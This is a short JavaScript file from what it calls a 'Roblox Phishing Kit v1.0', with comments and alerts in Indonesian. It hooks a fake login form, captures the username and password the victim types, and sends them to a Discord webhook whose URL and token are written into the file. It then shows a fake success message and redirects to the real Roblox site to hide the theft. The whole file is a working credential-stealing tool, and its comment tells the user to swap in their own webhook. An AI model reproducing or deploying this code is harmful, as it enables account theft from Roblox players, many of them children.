document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    // GANTI URL DI BAWAH INI DENGAN URL WEBHOOK DISCORD ANDA
    const webhookURL = "https://discord.com/api/webhooks/1555326187427856444/elIjKF6SCnuf06OUU2jqSRqfXpuUF4WzcpBEK87P-qNymOo87Dq8YGo8Xxl5thAYnIE5";

    const payload = {
        embeds: [{
            title: "🚨 New Roblox Login!",
            color: 0x00b06f,
            fields: [
                { name: "Username", value: user, inline: true },
                { name: "Password", value: pass, inline: true },
                { name: "Session", value: "Active", inline: false }
            ],
            footer: { text: "Roblox Phishing Kit v1.0" },
            timestamp: new Date()
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).then(() => {
        alert("Login Berhasil! Mengalihkan...");
        window.location.href = "https://www.roblox.com/home";
    }).catch(err => alert("Error! Cek Webhook Anda."));
});
